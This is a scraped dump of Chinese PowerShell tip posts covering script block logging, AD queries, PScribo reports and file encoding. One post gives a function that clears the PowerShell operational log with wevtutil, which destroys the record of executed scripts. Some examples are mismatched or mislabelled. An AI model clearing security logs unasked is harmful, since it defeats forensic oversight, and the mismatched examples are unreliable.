already translated SIDs # it is empty at first $translateTable = @{} # read all raw events $logInfo = @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } Get-WinEvent -FilterHashtable $logInfo | # take each raw set of data... ForEach-Object { # store the code in this entry # if this is the first part, take it if ($_.Properties[0].Value -eq 1) { $code = $_.Properties[2].Value } # else, add it to the $code variable else { $code += $_.Properties[2].Value } # return the object when all parts have been processed if ($_.Properties[0].Value -eq $_.Properties[1].Value) { # turn SID into user $userSID = $_.UserId # if the cache does not contain the user SID yet... if (!$translateTable.ContainsKey($userSid)) { try { # ...try and turn it into a real name, and add it # to the cache $identifier = New-Object System.Security.Principal.SecurityIdentifier($userSID) $result = $identifier.Translate( [System.Security.Principal.NTAccount]).Value $translateTable[$userSid] = $result } catch { # if this fails, use the SID instead of a real name $translateTable[$userSid] = $userSID } } else { } # create a new object and extract the interesting # parts from the raw data to compose a &quot;cooked&quot; # object with useful data [PSCustomObject]@{ # when this was logged Time = $_.TimeCreated # script code that was logged Code = $code # path of script file (this is empty for interactive # commands) Path = $_.Properties[4].Value # log level # by default, only level &quot;Warning&quot; will be logged Level = $_.LevelDisplayName # user who executed the code # take the real user name from the cache of translated # user names User = $translateTable[$userSID] } } }} 本质上，这个函数检查该脚本是否是由多段组成。如果是，它将代码添加到 $code 中，直到当前块等于 最后一块。就是这么简单。","link":"/2018/06/29/understanding-script-block-logging-part-6/"},{"title":"PowerShell 技能连载 - 理解脚本块日志（第 7 部分）","text":"这是关于 PowerShell 脚本块日志的迷你系列的第 7 部分。我们现在只需要一些能清理脚本快日志记录的清理工具，您需要管理员特权。 清理日之前请注意：这将清理整个 PowerShell 日志。如果您不是这台机器的所有者，请确认删除这些信息没有问题。别人可能需要用它来做法律安全分析。 以下是一个清除日志的函数： 12345678910111213141516171819202122232425262728function Clear-PowerShellLog{ &lt;# .SYNOPSIS Ckears the entire PowerShell operational log including script blog logging entries. Administrator privileges required. .DESCRIPTION Clears the complete content of the log Microsoft-Windows-PowerShell/Operational. This includes all logged script block code. .EXAMPLE Clear-PowershellLog Clears the entire log Microsoft-Windows-PowerShell/Operational. #&gt; [CmdletBinding(ConfirmImpact='High')] param() try { $ErrorActionPreference = 'Stop' wevtutil cl Microsoft-Windows-PowerShell/Operational } catch { Write-Warning &quot;Administrator privileges required. Run this command from an elevated PowerShell.&quot;","link":"/2018/07/02/understanding-script-block-logging-part-7/"},{"title":"PowerShell 技能连载 - 查看文件对应的可执行程序","text":"多数事情可以由 PowerShell 的内置指令完成，但是那还不够，您总是可以借助内置的 Windows API。例如，如果您想查看某个文件关联的应用程序，请试试这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041function Get-ExecutableForFile{ param ( [Parameter(Mandatory)] [string] $Path ) $Source = @&quot;using System;using System.Text;using System.Runtime.InteropServices;public class Win32API { [DllImport(&quot;shell32.dll&quot;, EntryPoint=&quot;FindExecutable&quot;)] public static extern long FindExecutableA(string lpFile, string lpDirectory, StringBuilder lpResult); public static string FindExecutable(string pv_strFilename) { StringBuilder objResultBuffer = new StringBuilder(1024); long lngResult = 0; lngResult = FindExecutableA(pv_strFilename, string.Empty, objResultBuffer); if(lngResult &gt;= 32) { return objResultBuffer.ToString(); } return string.Format(&quot;Error: ({0})&quot;, lngResult); } }&quot;@ Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue [Win32API]::FindExecutable($Path)} 以下是使用这个函数的方法： 1PS&gt; Set-EnvironmentVariable -Name test -Value 123 -Target User","link":"/2018/07/03/finding-executable-for-file/"},{"title":"PowerShell 技能连载 - 速度差别：读取大型日志文件","text":"需要读取大型日志文件时，例如，解析错误信息，PowerShell 既可以使用低内存占用的管道，也可以使用高内存占用的循环。不过，区别不仅在于内存的消耗，而且在速度上。 通过管道，不需要消耗太多的内存但是速度可能非常慢。通过传统的循环，脚本可以 10 倍甚至 100 倍的速度生成相同的结果： 123456789101112131415161718192021# make sure this file exists, or else# pick a different text file that is very large$path = 'C:\\Windows\\Logs\\DISM\\dism.log'# SLOW# filtering text file via pipeline (low memory usage)Measure-Command { $result = Get-Content -Path $Path | Where-Object { $_ -like '*Error*' }}# FAST# filtering text by first reading in all# content (high memory usage!) and then# using a classic loopMeasure-Command { $lines = Get-Content -Path $Path -ReadCount 0 $result = foreach ($line in $lines) { if ($line -like '*Error*') { $line } }}","link":"/2018/07/04/speed-difference-reading-large-log-files/"},{"title":"PowerShell 技能连载 - 使用缺省参数","text":"If you find yourself always using the same parameter values over again, try using PowerShell default parameters. Here is how:如果您常常反复使用相同的参数值，试着使用 PowerShell 的缺省参数。以下是实现方法： 123456789101112# hash table# Key =# Cmdlet:Parameter# Value =# Default value for parameter# * (Wildcard) can be used$PSDefaultParameterValues = @{'Stop-Process:ErrorAction' = 'SilentlyContinue''*:ComputerName' = 'DC-01''Get-*:Path' = 'c:\\windows'} 在它的核心部分，有一个名为 $PSDefaultParametersValues 的哈希表。缺省情况下，这个变量不存在或者为空。如果您想将缺省参数复位为它们的缺省值，请运行以下代码： 1PS&gt; $PSDefaultParameterValues = $null 哈希表的键是 cmdlet 名和参数值，通过 *** 来分隔。支持通配符。哈希表的值是缺省参数值。 在上述例子中： Stop-Process 的 -ErrorAction 参数将总是使用 “SilentlyContinue” 值。 所有使用 -ComputerName 参数的 cmdlet 将使用 “DC-01”。 所有使用 Get 动词和 -Path 参数的 cmdlet 将默认使用 “C:\\Windows” 值 缺省参数可能很方便，也可能很怪异。您不应在配置文件脚本中定义它们，因为您有可能忘了做过这件事，而下周会奇怪 cmdlet 执行的行为和预期不一致。 并且缺省参数只对 cmdlet 和高级函数有效。它们对简单函数是无效的： 12345678910111213141516171819function Start-SimpleFunction{ param($ID=100) &quot;ID = $ID&quot;}function Start-AdvancedFunction{ [CmdletBinding()] param($ID=100) &quot;ID = $ID&quot;}$PSDefaultParameterValues = @{ &quot;Start-*Function:ID&quot; = 12345} 以下是执行结果： 1234567PS&gt; Start-SimpleFunctionID = 100PS&gt; Start-AdvancedFunctionID = 12345PS&gt;","link":"/2018/07/05/using-default-parameters1/"},{"title":"PowerShell 技能连载 - 在函数内使用持久变量","text":"默认情况下，当一个 PowerShell 函数退出时，它将“忘记”所有的内部变量。然而，有一种办法可以创建持久的内部变量。以下是实现方法： 1234567891011121314# create a script block with internal variables# that will persist$c = &amp; { # define an internal variable that will # PERSIST and keep its value even though # the function exits $a = 0 { # use the internal variable $script:a++ &quot;You called me $a times!&quot; }.GetNewClosure()} 这段代码创建一个包含内部变量的脚本块。当您多次运行这个脚本块时，计数器会累加： 12345678PS&gt; &amp; $cYou called me 1 times!PS&gt; &amp; $cYou called me 2 times!PS&gt; &amp; $cYou called me 3 times! 然而，脚本内的 $a 变量的作用域既不是 global 也不是 scriptglobal。它的作用域只在脚本块的内部： 1PS&gt; $a 要将脚本块转换为函数，请加上这段代码： 1234567PS&gt; Set-Item -Path function:Test-Function -Value $cPS&gt; Test-FunctionYou called me 5 times!PS&gt; Test-FunctionYou called me 6 times!","link":"/2018/07/06/using-persisting-variables-inside-functions/"},{"title":"PowerShell 技能连载 - 从函数中返回富对象（第 1 部分）","text":"如果一个 PowerShell 函数需要返回多于一类信息，请确保将这些信息集中到一个富对象中。最简单的实现方式是创建一个类似 [PSCustomObject]@{} 这样的自定义对象： 123456789101112131415function Get-TestData{ # if a function is to return more than one information kind, # wrap it in a custom object [PSCustomObject]@{ # wrap anything you'd like to return ID = 1 Random = Get-Random Date = Get-Date Text = 'Hallo' BIOS = Get-WmiObject -Class Win32_BIOS User = $env:username }} 自定义对象的核心是一个哈希表：每个哈希表键将会转换为一个属性。这个方式的好处是您可以使用哈希表中的变量甚至命令，所以这样要收集您想返回的所有信息，将它合并为一个自描述的对象很容易： 12345678910PS&gt; Get-TestDataID : 1Random : 1794057589Date : 25.05.2018 13:06:57Text : HalloBIOS : \\\\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOS.Name=&quot;1.6.1&quot;,SoftwareElementID=&quot;1.6.1&quot;,SoftwareElementState=3,TargetOperatingSys tem=0,Version=&quot;DELL - 1072009&quot;User : tobwe","link":"/2018/07/09/returning-rich-objects-from-functions-part-1/"},{"title":"PowerShell 技能连载 - 从函数中返回富对象（第 2 部分）","text":"当一个函数返回多于四个属性时，PowerShell 将输出结果格式化为列表，否则格式化为表格。在您学习新的方法来影响这种行为之前，请自己验证一下。以下函数返回一个多于 6 个属性的对象： 123456789101112131415function Get-TestData{ # if a function is to return more than one information kind, # wrap it in a custom object [PSCustomObject]@{ # wrap anything you'd like to return ID = 1 Random = Get-Random Date = Get-Date Text = 'Hello' BIOS = Get-WmiObject -Class Win32_BIOS User = $env:username }} 结果是以表格形式呈现： 12345678910PS&gt; Get-TestDataID : 1Random : 147704985Date : 25.05.2018 13:09:26Text : HelloBIOS : \\\\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOS.Name=&quot;1.6.1&quot;,SoftwareElementID=&quot;1.6.1&quot;,SoftwareElementState=3,TargetOperatingSys tem=0,Version=&quot;DELL - 1072009&quot;User : tobwe 当移除掉一些属性，限制属性个数为 4 个或更少时，PowerShell 输出一个表格： 12345PS&gt; Get-TestDataID Random Text User-- ------ ---- ---- 1 567248729 Hello tobwe 通常，表格的形式比较容易阅读，特别是有多个数据集的时候。当您得到一个 4 个或更少属性的表格时，您可能不是始终希望返回值只有 4 个属性。所以为什么不像类似 cmdlet 一样处理它呢？ Cmdlet 默认情况下只显示属性的一部分： 12345PS&gt; Get-Service | Select-Object -First 1Status Name DisplayName------ ---- -----------Running AdobeARMservice Adobe Acrobat Update Service 使用 Select-Object 可以显示地获得所有属性的列表： 12345678910111213141516171819PS&gt; Get-Service | Select-Object -First 1 -Property *Name : AdobeARMserviceRequiredServices : {}CanPauseAndContinue : FalseCanShutdown : FalseCanStop : TrueDisplayName : Adobe Acrobat Update ServiceDependentServices : {}MachineName : .ServiceName : AdobeARMserviceServicesDependedOn : {}ServiceHandle :Status : RunningServiceType : Win32OwnProcessStartType : AutomaticSite :Container 显然，有第一公民和第二公民之分。在您自己的函数中，您可以类似这样定义第一公民： 1234567891011121314151617181920function Get-TestData{ # define the first-class citizen [string[]]$visible = 'ID','Date','User' $info = New-Object System.Management.Automation.PSPropertySet('DefaultDisplayPropertySet',$visible) [PSCustomObject]@{ # wrap anything you'd like to return ID = 1 Random = Get-Random Date = Get-Date Text = 'Hello' BIOS = Get-WmiObject -Class Win32_BIOS User = $env:username } | # add the first-class citizen info to your object Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $info -PassThru} 现在，您的函数的行为类似 cmdlet，而且您没有定义多于 4 个一等公民，所以缺省情况下得到一个表格的形式： 123456789101112131415161718PS&gt; Get-TestDataID Date User-- ---- ---- 1 25.05.2018 13:15:15 tobwePS&gt; Get-TestData | Select-Object -Property *ID : 1Random : 1298877814Date : 25.05.2018 13:15:22Text : HelloBIOS : \\\\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOS.Name=&quot;1.6.1&quot;,SoftwareElementID=&quot;1.6.1&quot;,SoftwareElementState=3,TargetOperatingSys tem=0,Version=&quot;DELL - 1072009&quot;User : tobwe","link":"/2018/07/10/returning-rich-objects-from-functions-part-2/"},{"title":"PowerShell 技能连载 - 交换变量值","text":"以下是一个在一行代码中交换变量内容的快速技能： 12345678$a = 1$b = 2# switch variable content$a, $b = $b, $a$a$b","link":"/2018/07/11/exchanging-variable-values/"},{"title":"PowerShell 技能连载 - 自动生成文档和报告（第 1 部分）","text":"Iain Brighton 创建了一个名为 “PScribo” 的免费的 PowerShell 模块，可以快速地创建文本、HTML 或 Word 格式的文档和报告。 要使用这个模块，只需要运行这条命令： 1Install-Module -Name PScribo -Scope CurrentUser -Force 下一步，您可以类似这样生成简单的文档： 1234567891011121314151617181920# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }Document 'Report' { Paragraph -Style Heading1 &quot;System Inventory for $env:computername&quot; Paragraph -Style Heading2 'BIOS Information' Paragraph 'BIOS details:' -Bold $bios = Get-WmiObject -Class Win32_BIOS | Out-String Paragraph $bios.Trim()} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath","link":"/2018/07/12/automatic-document-report-generation-part-1/"},{"title":"PowerShell 技能连载 - 自动生成文档和报告（第 2 部分）","text":"Iain Brighton 创建了一个名为 “PScribo” 的免费的 PowerShell 模块，可以快速地创建文本、HTML 或 Word 格式的文档和报告。 要使用这个模块，只需要运行这条命令： 1Install-Module -Name PScribo -Scope CurrentUser -Force 今天，我们将生成一个包含动态表格内容的文档： 1234567891011121314151617181920212223242526272829# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }# generate documentDocument 'ServiceReport' { # generate the service information to use # (requires PowerShell 5 because prior to PowerShell 5, Get-Service does not supply # StartType - alternative: use Get-WmiObject -Class Win32_Service, and adjust # property names) $services = Get-Service | Select-Object -Property DisplayName, Status, StartType Paragraph -Style Heading1 &quot;System Inventory for $env:computername&quot; Paragraph -Style Heading2 &quot;Services ($($services.Count) Services found):&quot; # generate a table with one line per service $services | # select the properties to display, and the header texts to use Table -Columns DisplayName, Status, StartType -Headers 'Service Name','Current State','Startup Type' -Width 0} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath 当您运行这段代码时，它生成三个名为 ServiceReport.docx/html/txt 的文件。如您所见，该报告包含表格形式的服务列表。","link":"/2018/07/13/automatic-document-report-generation-part-2/"},{"title":"PowerShell 技能连载 - 自动生成文档和报告（第 4 部分）","text":"Iain Brighton 创建了一个名为 “PScribo” 的免费的 PowerShell 模块，可以快速地创建文本、HTML 或 Word 格式的文档和报告。 要使用这个模块，只需要运行这条命令： 1Install-Module -Name PScribo -Scope CurrentUser -Force 再之前的技能中，我们介绍了如何生成动态的表格。今天，我们来学习如何根据特定的条件，例如配置错误，高亮某个单元格。 要实现这个目的，我们使用 Set-Style 将格式应用到独立的属性上。以下示例代码选择所有 StartType 的值为 Automatic 但 Status 的值是 Stopped 的对象，并将 HighlightedService 应用在 Status 属性上： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }# generate documentDocument 'HighlightedReport' { # get the service data to use: # generate the service information to use # (requires PowerShell 5 because prior to PowerShell 5, Get-Service does not supply # StartType - alternative: use Get-WmiObject -Class Win32_Service, and adjust # property names) # IMPORTANT: run this information through Select-Object to get a cloned copy # of the original objects so that style information can be appended $services = Get-Service | Select-Object -Property DisplayName, Status, StartType | Sort-Object -Property DisplayName # write heading Paragraph &quot;Services ($($services.Count) Services found):&quot; # define style to use for highlighting Style -Name HighlightedService -Color Red -BackgroundColor Yellow -Bold # apply a different format to cell &quot;Status&quot; for all objects where # status is &quot;Stopped&quot; and StartType is &quot;Automatic&quot; $services | Where { $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'} | Set-Style -Property Status -Style HighlightedService # create the table $services | Table -Columns DisplayName,Status,StartType -Headers 'Display Name','Status','Startup Type' -Tabs 1} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath","link":"/2018/07/17/automatic-document-report-generation-part-4/"},{"title":"PowerShell 技能连载 - 自动生成文档和报告（第 3 部分）","text":"Iain Brighton 创建了一个名为 “PScribo” 的免费的 PowerShell 模块，可以快速地创建文本、HTML 或 Word 格式的文档和报告。 要使用这个模块，只需要运行这条命令： 1Install-Module -Name PScribo -Scope CurrentUser -Force 在前一个技能中，我们介绍了如何生成动态的表格。今天，我们将介绍调整表格和显示任意数据是多么容易。我们从前一个示例中取出服务列表： 1234567891011121314151617181920212223242526272829# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }# generate documentDocument 'ServiceReport' { # generate the service information to use # (requires PowerShell 5 because prior to PowerShell 5, Get-Service does not supply # StartType - alternative: use Get-WmiObject -Class Win32_Service, and adjust # property names) $services = Get-Service | Select-Object -Property DisplayName, Status, StartType Paragraph -Style Heading1 &quot;System Inventory for $env:computername&quot; Paragraph -Style Heading2 &quot;Services ($($services.Count) Services found):&quot; # generate a table with one line per service $services | # select the properties to display, and the header texts to use Table -Columns DisplayName, Status, StartType -Headers 'Service Name','Current State','Startup Type' -Width 0} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath 只需要做少许调整，示例代码将返回所有 ad 用户（假设您安装了 ActiveDirectory 模块并且能操作 AD）： 1234567891011121314151617181920212223242526# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }# generate documentDocument 'ADUser' { # get 40 AD user to illustrate $user = Get-ADUser -Filter * -ResultSetSize 40 -Properties mail | Select-Object -Property Name, mail, SID Paragraph -Style Heading1 &quot;AD User Liste&quot; # generate a table with one line per user $user | # select the properties to display, and the header texts to use Table -Columns Name, mail, SID -Headers 'Employee','Email','SID' -Width 0} |Export-Document -Path $OutPath -Format Word# open the generated documentsexplorer $OutPath","link":"/2018/07/16/automatic-document-report-generation-part-3/"},{"title":"PowerShell 技能连载 - 自动生成文档和报告（第 4 部分）","text":"Iain Brighton 创建了一个名为 “PScribo” 的免费的 PowerShell 模块，可以快速地创建文本、HTML 或 Word 格式的文档和报告。 要使用这个模块，只需要运行这段代码： 1234567891011121314151617181920# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }Document 'Report' {Paragraph -Style Heading1 &quot;System Inventory for $env:computername&quot;Paragraph -Style Heading2 'BIOS Information'Paragraph 'BIOS details:' -Bold$bios = Get-WmiObject -Class Win32_BIOS | Out-StringParagraph $bios.Trim()} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath 在前一个技能中，我们演示了如何通过将对象转换为纯文本的方式，将结果从 cmdlet 添加到文本报告： 1234567891011121314151617181920# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }Document 'Report' {Paragraph -Style Heading1 &quot;System Inventory for $env:computername&quot;Paragraph -Style Heading2 'BIOS Information'Paragraph 'BIOS details:' -Bold$bios = Get-WmiObject -Class Win32_BIOS | Out-StringParagraph $bios.Trim()} |Export-Document -Path $OutPath -Format Word,Html,Text# open the generated documentsexplorer $OutPath 这是很直接的方法，但是比较土。如果您希望向复杂的表格添加对象结果，请试试这种方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# https://github.com/iainbrighton/PScribo# help about_document# create a folder to store generated documents$OutPath = &quot;c:\\temp\\out&quot;$exists = Test-Path -Path $OutPathif (!$exists) { $null = New-Item -Path $OutPath -ItemType Directory -Force }# generate documentDocument 'BIOS' {# get an object with rich information$info = Get-WmiObject -Class Win32_BIOS# find out the property names that have actual information$properties = $info | Get-Member -MemberType *property |Select-Object -ExpandProperty Name |Where-Object {$info.$_ -ne $null -and $info.$_ -ne ''} |Sort-Object# turn each property into a separate object$infos = $properties | ForEach-Object {[PSCustomObject]@{Name = $_Value = $info.$_}}Paragraph -Style Heading1 &quot;BIOS Information&quot;# generate a table with one line per property$infos |# select the properties to display, and the header texts to useTable -Columns Name,Value -Headers 'Item','Content' -Width 0} |Export-Document -Path $OutPath -Format Word# open the generated documentsexplorer $OutPath 它的基本思想史为每个对象属性创建新的对象，然后以表格的方式显示它们。这段代码显示 BIOS 信息的详细报告。","link":"/2018/07/18/automatic-document-report-generation-part-5/"},{"title":"PowerShell 技能连载 - 进度条定时器","text":"这是一个使用 PowerShell 进度条的简单例子。这段代码显示一个休息倒计时的进度条。只需要调整您希望暂停的秒数即可。您可以使用这个例子在班级或会议中显示休息时间： 12345678$seconds = 601..$seconds |ForEach-Object { $percent = $_ * 100 / $seconds;Write-Progress -Activity Break -Status &quot;$($seconds - $_) seconds remaining...&quot; -PercentComplete $percent;Start-Sleep -Seconds 1}","link":"/2018/07/19/progress-bar-timer/"},{"title":"PowerShell 技能连载 - 查找嵌套的 Active Directory 成员（第 1 部分）","text":"ActiveDirectory 模块（免费的 RSAT 工具的一部分）提供许多 AD cmdlet。其中一个可以读取整个直接组的成员，例如： 1PS&gt; Get-ADPrincipalGroupMembership -Identity $env:username 然而，这个 cmdlet 无法列出间接组的成员，而且它还有一个 bug：在某些场景下，它只是报告“未知错误”。 这是一个简单的读取所有组成员（包括间接成员）的替代方案： 123456789101112131415161718192021function Get-NestedGroupMember{param([Parameter(Mandatory,ValueFromPipeline)][string]$Identity)process{$user = Get-ADUser -Identity $Identity$userdn = $user.DistinguishedName$strFilter = &quot;(member:1.2.840.113556.1.4.1941:=$userdn)&quot;Get-ADGroup -LDAPFilter $strFilter -ResultPageSize 1000}}Get-NestedGroupMember -Identity $env:username |Select-Object -Property Name, DistinguishedName","link":"/2018/07/20/finding-nested-active-directory-memberships-part-1/"},{"title":"PowerShell 技能连载 - 查找嵌套的 Active Directory 成员（第 2 部分）","text":"在前一个技能中我们演示了如何使用 ActiveDirectory 模块中的 cmdlet 来查找某个 Active Directory 用户所有直接和间接的成员。 如果您没有权限操作 ActiveDirectory 模块，PowerShell 也可以使用纯 .NET 方法来获取成员： 12345678910111213141516171819202122232425262728293031323334function Get-NestedGroupMember{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $distinguishedName ) process { $DomainController = $env:logonserver.Replace(&quot;\\\\&quot;,&quot;&quot;) $Domain = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$DomainController&quot;) $Searcher = New-Object System.DirectoryServices.DirectorySearcher($Domain) $Searcher.PageSize = 1000 $Searcher.SearchScope = &quot;subtree&quot; $Searcher.Filter = &quot;(&amp;(objectClass=group)(member:1.2.840.113556.1.4.1941:=$distinguishedName))&quot; # attention: property names are case-sensitive! $colProplist = &quot;name&quot;,&quot;distinguishedName&quot; foreach ($i in $colPropList){$Searcher.PropertiesToLoad.Add($i) | Out-Null} $all = $Searcher.FindAll() $all.Properties | ForEach-Object { [PSCustomObject]@{ # attention: property names on right side are case-sensitive! Name = $_.name[0] DN = $_.distinguishedname[0] } } }}# make sure you specify a valid distinguishedname for a user belowGet-NestedGroupMember -distinguishedName 'CN=UserName,DC=powershell,DC=local'","link":"/2018/07/23/finding-nested-active-directory-memberships-part-2/"},{"title":"PowerShell 技能连载 - 查找嵌套的 Active Directory 成员（第 3 部分）","text":"在前一个技能中我们演示了如何使用 ActiveDirectory 模块中的 cmdlet 来查找某个 Active Directory 用户所有直接和间接的成员。如果您想知道当前用户的成员信息，还有一个更简单（而且更快）的方法：用当前用户的 access token 来获取当前有效的组成员： 12345$groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups.Translate([System.Security.Principal.NTAccount])$groups$groups.Count","link":"/2018/07/24/finding-nested-active-directory-memberships-part-3/"},{"title":"PowerShell 技能连载 - 处理文件编码和 BOM","text":"当您将文本内容写入到文件时，PowerShell cmdlet 可以指定文件编码。编码决定了字符的存储方式，并且当某个字符显示乱码时，通常是由于编码不匹配造成的。 然而，有一些编码设置是无法通过 cmdlet 参数控制的。以下是一个例子。将一个进程列表保存到 CSV 文件： 1234$Path = &quot;$env:temp\\export.csv&quot;Get-Process | Export-CSV -NoTypeInformation -UseCulture -Encoding UTF8 -Path $Path 您现在可以在 Excel 或任意文本编辑器中打开生成的 CSV 文件。当您使用 Notepad++ 打开文件时，状态栏显示编码格式为：UTF-8-BOM。 这段 PowerShell 代码以 UTF-8 编码生成文件，所以这段没有问题。BOM 代表“字节顺序标记” (Byte Order Mark)。当使用 BOM 时，将在文件的起始处增加一个特定的字节顺序标识，这样程序可以自动识别使用的编码格式。 不过，一些编辑器和数据处理系统无法处理 BOM。要移除 BOM 并使用纯文本编码，请使用类似这样的 PowerShell 代码： 123456function Remove-BomFromFile($OldPath, $NewPath){ $Content = Get-Content $OldPath -Raw $Utf8NoBomEncoding = New-Object System.Text.UTF8Encoding $False [System.IO.File]::WriteAllLines($NewPath, $Content, $Utf8NoBomEncoding)} 在上述例子中，要将 UTF-8-BOM 转化为纯 UTF-8，请运行这段代码： 123$Path = &quot;$env:temp\\export.csv&quot;$NewPath = &quot;$env:temp\\export_new.csv&quot;Remove-BomFromFile -OldPath $Path -NewPath $NewPath","link":"/2018/07/25/dealing-with-file-encoding-and-bom/"},{"title":"PowerShell 技能连载 - 通过参数传递命令","text":"函数参数有一个很少见的用法：用户可以传入一个输出命令： 1234567891011121314151617function Get-ProcessList{ param ( [string] [ValidateSet('GridView','String')] $OutputMode = 'String' ) Get-Process | &amp; &quot;Out-$OutputMode&quot;}# output as a stringGet-ProcessList -OutputMode String# output in a grid view windowGet-ProcessList -OutputMode GridView","link":"/2018/07/26/passing-commands-via-parameter/"},{"title":"PowerShell 技能连载 - 文件系统压力测试","text":"如果您想生成一个超大文件来做压力测试，您不需要浪费时间写入大量数据到一个文件中，使它体积增大。相反，只需要设置一个期望的文件大小来占据磁盘空间即可。 以下是创建一个 1GB 测试文件的方法： 12345678910# create a test file$path = &quot;$env:temp\\dummyFile.txt&quot;$file = [System.IO.File]::Create($path)# set the file size (file uses random content)$file.SetLength(1gb)$file.Close()# view file propertiesGet-Item $path","link":"/2018/07/27/file-system-stress-test/"},{"title":"PowerShell 技能连载 - 创建临时文件名","text":"当您需要写入信息到磁盘时，使用唯一的临时文件名是合理的。如果您使用静态的文件名并且多次运行您的代码，会一次又一次地覆盖写入同一个文件。如果某个人打开该文件并锁定它，将导致脚本执行失败。 以下是一些简单的生成唯一的临时文件名的方法： 1234567891011# use a random number (slight chance of duplicates)$path = &quot;$env:temp\\liste$(Get-Random).csv&quot;&quot;Path is: $path&quot;# use a GUID. Guaranteed to be unique but somewhat hard on the human eye$path = &quot;$env:temp\\liste$([Guid]::NewGuid().toString()).csv&quot;&quot;Path is: $path&quot;# use timestamp with milliseconds$path = &quot;$env:temp\\liste$(Get-Date -format yyyy-MM-dd_HHmmss_ffff).csv&quot;&quot;Path is: $path&quot;","link":"/2018/07/30/creating-temp-file-names/"},{"title":"PowerShell 技能连载 - 使用 AD 过滤器配合 cmdlet（第 1 部分）","text":"ActiveDirectory Powershell 模块中包含了免费的 RSAT 工具。您可以使用这个模块中的 cmdlet 来获取 AD 信息，例如用户或者组名。例如 Get-ADUser 和 Get-ADComputer 等 cmdlet 支持服务端过滤器。不过，它们的工作方式可能和您设想的略有不同。 对于简单的查询，这些过滤器使用起来很容易。例如，这行代码筛选出前五个名字以 “A” 开头的用户，而且过滤器的语法看起来很像 PowerShell 代码： 1Get-ADUser -Filter { name -like 'A*' } -ResultSetSize 5 不过它还不是真的 PowerShell 语法：-Filter 参数接受的是纯文本，所以您也可以使用引号代替大括号： 1Get-ADUser -Filter &quot; name -like 'A*' &quot; -ResultSetSize 5 使用大括号（脚本块）仍是一个好主意，因为大括号包括的是 PowerShell 代码，所以在大括号内写代码时可以获得代码高亮和语法错误特性。脚本块稍后可以方便地转换为字符串（Get-ADUser 会自动处理）。","link":"/2018/07/31/using-ad-filters-with-cmdlets-part-1/"},{"title":"PowerShell 技能连载 - 使用 AD 过滤器配合 cmdlet（第 2 部分）","text":"在前一个技能中，我们开始学习 ActiveDirectory 模块（免费的 RSAT 工具）中的 cmdlet 如何过滤执行结果。您学到了过滤器看起来像 PowerShell 代码，但是实际上不是。 对于简单的过滤，该过滤器工作正常。然而，当您使用操作符以外的 PowerShell 语言特性时，您很快会发现实际中使用的过滤器并不是 PowerShell 代码。 如果您想获得一个未配置文件路径的 AD 用户列表，您可能会好奇地尝试以下的代码： 12Get-ADUser -Filter { profilePath -eq $null} -ResultSetSize 5Get-ADUser -Filter { profilePath -eq ''} -ResultSetSize 5 两个过滤器都会失败。PowerShell 报告 $null 变量是未知的。而在第二行中，报告该该搜索查询不合法。 这是为什么大多数情况下使用在 Active Directory 常见的原生 LDAPFilters 是更方便（而且更快）的。LDAP 过滤器是括号中的表达式。它们包含一个名称和一个操作符。以下代码返回前 5 个有配置文件路径的用户： 1Get-ADUser -LDAPFilter '(profilePath=*)' -ResultSetSize 5 加上 “!” 以后，可以将结果反转，所以以下代码将返回前 5 个没有配置文件路径的用户： 1Get-ADUser -LDAPFilter '(!profilePath=*)' -ResultSetSize 5 以下代码将返回用户和他们的配置文件路径的列表： 12Get-ADUser -LDAPFilter '(profilePath=*)' -Properties profilePath |Select-Object samaccountName, profilePath","link":"/2018/08/01/using-ad-filters-with-cmdlets-part-2/"},{"title":"PowerShell 技能连载 - 使用 AD 过滤器配合 cmdlet（第 3 部分）","text":"在之前的技能中，我们开始学习 ActiveDirectory 模块（免费的 RSAT 工具）中的 cmdlet 如何过滤执行结果，并且开始以我们的方式插入快捷且完善的 LDAP 过滤器。 LDAP 过滤器有一个强制的需求。您必须使用原始的 ActiveDirectory 属性名，而不是许多 PowerShell cmdlet 中的友好名称。所以 “country” 需要改为 AD 的属性名 